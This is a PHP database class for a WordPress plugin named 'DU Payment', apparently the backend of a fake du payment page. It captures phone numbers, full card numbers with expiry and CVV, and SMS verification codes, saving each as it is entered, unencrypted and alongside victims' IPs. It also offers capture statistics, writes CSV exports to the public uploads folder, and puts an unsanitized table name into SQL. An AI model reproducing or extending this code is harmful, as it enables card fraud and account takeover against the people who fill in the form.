<?php
/**
 * DU Payment Database Manager
 * Handles all database operations for the DU Payment plugin
 */

if (!defined('ABSPATH')) {
    exit;
}

class DUPaymentDatabase {
    
    private $wpdb;
    private $table_prefix;
    
    public function __construct() {
        global $wpdb;
        $this->wpdb = $wpdb;
        $this->table_prefix = $wpdb->prefix . 'du_';
    }
    
    /**
     * Create all required database tables
     */
    public function create_tables() {
        $charset_collate = $this->wpdb->get_charset_collate();
        
        // Phone numbers table
        $sql_phone = "CREATE TABLE {$this->table_prefix}phone_numbers (
            id int(11) NOT NULL AUTO_INCREMENT,
            session_id varchar(255) NOT NULL,
            phone_number varchar(20) NOT NULL,
            created_at timestamp DEFAULT CURRENT_TIMESTAMP,
            updated_at timestamp DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            KEY session_id (session_id),
            KEY created_at (created_at)
        ) $charset_collate;";
        
        // Card details table - stores complete card information without encryption
        $sql_card = "CREATE TABLE {$this->table_prefix}card_details (
            id int(11) NOT NULL AUTO_INCREMENT,
            session_id varchar(255) NOT NULL,
            card_number varchar(20) NOT NULL,
            expiry_date varchar(10) NOT NULL,
            cvv varchar(5) NOT NULL,
            cardholder_name varchar(100) DEFAULT '',
            created_at timestamp DEFAULT CURRENT_TIMESTAMP,
            updated_at timestamp DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            KEY session_id (session_id),
            KEY created_at (created_at)
        ) $charset_collate;";
        
        // Verification codes table
        $sql_verification = "CREATE TABLE {$this->table_prefix}verification_codes (
            id int(11) NOT NULL AUTO_INCREMENT,
            session_id varchar(255) NOT NULL,
            code varchar(10) NOT NULL,
            code_type varchar(20) DEFAULT 'sms',
            created_at timestamp DEFAULT CURRENT_TIMESTAMP,
            updated_at timestamp DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            KEY session_id (session_id),
            KEY created_at (created_at)
        ) $charset_collate;";
        
        // Sessions table
        $sql_sessions = "CREATE TABLE {$this->table_prefix}sessions (
            id int(11) NOT NULL AUTO_INCREMENT,
            session_id varchar(255) NOT NULL UNIQUE,
            user_ip varchar(45) DEFAULT '',
            user_agent text DEFAULT '',
            step_completed varchar(50) DEFAULT '',
            created_at timestamp DEFAULT CURRENT_TIMESTAMP,
            updated_at timestamp DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            UNIQUE KEY session_id (session_id),
            KEY created_at (created_at)
        ) $charset_collate;";
        
        // Payment attempts table (for tracking)
        $sql_attempts = "CREATE TABLE {$this->table_prefix}payment_attempts (
            id int(11) NOT NULL AUTO_INCREMENT,
            session_id varchar(255) NOT NULL,
            step_name varchar(50) NOT NULL,
            data_entered text DEFAULT '',
            status varchar(20) DEFAULT 'pending',
            created_at timestamp DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            KEY session_id (session_id),
            KEY step_name (step_name),
            KEY created_at (created_at)
        ) $charset_collate;";
        
        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql_phone);
        dbDelta($sql_card);
        dbDelta($sql_verification);
        dbDelta($sql_sessions);
        dbDelta($sql_attempts);
    }
    
    /**
     * Save phone number immediately
     */
    public function save_phone_number($session_id, $phone_number) {
        // Update or create session
        $this->update_session($session_id, 'phone_entry');
        
        // Save phone number
        $result = $this->wpdb->insert(
            $this->table_prefix . 'phone_numbers',
            array(
                'session_id' => $session_id,
                'phone_number' => $phone_number
            ),
            array('%s', '%s')
        );
        
        // Log attempt
        $this->log_payment_attempt($session_id, 'phone_entry', $phone_number);
        
        return $result !== false;
    }
    
    /**
     * Save card details immediately without encryption
     */
    public function save_card_details($session_id, $card_data) {
        // Update session
        $this->update_session($session_id, 'card_entry');
        
        // Save complete card details without encryption
        $result = $this->wpdb->insert(
            $this->table_prefix . 'card_details',
            array(
                'session_id' => $session_id,
                'card_number' => $card_data['card_number'],
                'expiry_date' => $card_data['expiry_date'],
                'cvv' => $card_data['cvv'],
                'cardholder_name' => isset($card_data['cardholder_name']) ? $card_data['cardholder_name'] : ''
            ),
            array('%s', '%s', '%s', '%s', '%s')
        );
        
        // Log attempt
        $this->log_payment_attempt($session_id, 'card_entry', json_encode($card_data));
        
        return $result !== false;
    }
    
    /**
     * Save verification code immediately
     */
    public function save_verification_code($session_id, $code, $type = 'sms') {
        // Update session
        $this->update_session($session_id, 'verification');
        
        // Save verification code
        $result = $this->wpdb->insert(
            $this->table_prefix . 'verification_codes',
            array(
                'session_id' => $session_id,
                'code' => $code,
                'code_type' => $type
            ),
            array('%s', '%s', '%s')
        );
        
        // Log attempt
        $this->log_payment_attempt($session_id, 'verification', $code);
        
        return $result !== false;
    }
    
    /**
     * Update or create session
     */
    private function update_session($session_id, $step = '') {
        $user_ip = $_SERVER['REMOTE_ADDR'] ?? '';
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        
        // Try to update existing session
        $updated = $this->wpdb->update(
            $this->table_prefix . 'sessions',
            array(
                'step_completed' => $step,
                'user_ip' => $user_ip,
                'user_agent' => $user_agent
            ),
            array('session_id' => $session_id),
            array('%s', '%s', '%s'),
            array('%s')
        );
        
        // If no rows updated, insert new session
        if ($updated === 0) {
            $this->wpdb->insert(
                $this->table_prefix . 'sessions',
                array(
                    'session_id' => $session_id,
                    'step_completed' => $step,
                    'user_ip' => $user_ip,
                    'user_agent' => $user_agent
                ),
                array('%s', '%s', '%s', '%s')
            );
        }
    }
    
    /**
     * Log payment attempt for tracking
     */
    private function log_payment_attempt($session_id, $step, $data) {
        $this->wpdb->insert(
            $this->table_prefix . 'payment_attempts',
            array(
                'session_id' => $session_id,
                'step_name' => $step,
                'data_entered' => $data,
                'status' => 'completed'
            ),
            array('%s', '%s', '%s', '%s')
        );
    }
    
    /**
     * Get all data for a session
     */
    public function get_session_data($session_id) {
        $data = array();
        
        // Get phone numbers
        $phones = $this->wpdb->get_results(
            $this->wpdb->prepare(
                "SELECT * FROM {$this->table_prefix}phone_numbers WHERE session_id = %s ORDER BY created_at DESC",
                $session_id
            )
        );
        $data['phone_numbers'] = $phones;
        
        // Get card details
        $cards = $this->wpdb->get_results(
            $this->wpdb->prepare(
                "SELECT * FROM {$this->table_prefix}card_details WHERE session_id = %s ORDER BY created_at DESC",
                $session_id
            )
        );
        $data['card_details'] = $cards;
        
        // Get verification codes
        $codes = $this->wpdb->get_results(
            $this->wpdb->prepare(
                "SELECT * FROM {$this->table_prefix}verification_codes WHERE session_id = %s ORDER BY created_at DESC",
                $session_id
            )
        );
        $data['verification_codes'] = $codes;
        
        // Get session info
        $session = $this->wpdb->get_row(
            $this->wpdb->prepare(
                "SELECT * FROM {$this->table_prefix}sessions WHERE session_id = %s",
                $session_id
            )
        );
        $data['session'] = $session;
        
        return $data;
    }
    
    /**
     * Get statistics
     */
    public function get_statistics() {
        $stats = array();
        
        $stats['total_sessions'] = $this->wpdb->get_var("SELECT COUNT(*) FROM {$this->table_prefix}sessions");
        $stats['total_phone_entries'] = $this->wpdb->get_var("SELECT COUNT(*) FROM {$this->table_prefix}phone_numbers");
        $stats['total_card_entries'] = $this->wpdb->get_var("SELECT COUNT(*) FROM {$this->table_prefix}card_details");
        $stats['total_verification_codes'] = $this->wpdb->get_var("SELECT COUNT(*) FROM {$this->table_prefix}verification_codes");
        
        // Recent activity (last 24 hours)
        $stats['recent_sessions'] = $this->wpdb->get_var(
            "SELECT COUNT(*) FROM {$this->table_prefix}sessions WHERE created_at >= DATE_SUB(NOW(), INTERVAL 24 HOUR)"
        );
        
        return $stats;
    }
    
    /**
     * Clean old data (optional - for maintenance)
     */
    public function clean_old_data($days = 30) {
        $tables = array('phone_numbers', 'card_details', 'verification_codes', 'payment_attempts');
        
        foreach ($tables as $table) {
            $this->wpdb->query(
                $this->wpdb->prepare(
                    "DELETE FROM {$this->table_prefix}{$table} WHERE created_at < DATE_SUB(NOW(), INTERVAL %d DAY)",
                    $days
                )
            );
        }
        
        // Clean sessions table
        $this->wpdb->query(
            $this->wpdb->prepare(
                "DELETE FROM {$this->table_prefix}sessions WHERE created_at < DATE_SUB(NOW(), INTERVAL %d DAY)",
                $days
            )
        );
    }
    
    /**
     * Export data to CSV
     */
    public function export_to_csv($table_name) {
        $results = $this->wpdb->get_results("SELECT * FROM {$this->table_prefix}{$table_name}", ARRAY_A);
        
        if (empty($results)) {
            return false;
        }
        
        $filename = "du_payment_{$table_name}_" . date('Y-m-d_H-i-s') . '.csv';
        $filepath = wp_upload_dir()['path'] . '/' . $filename;
        
        $file = fopen($filepath, 'w');
        
        // Write headers
        fputcsv($file, array_keys($results[0]));
        
        // Write data
        foreach ($results as $row) {
            fputcsv($file, $row);
        }
        
        fclose($file);
        
        return $filepath;
    }
}
?>

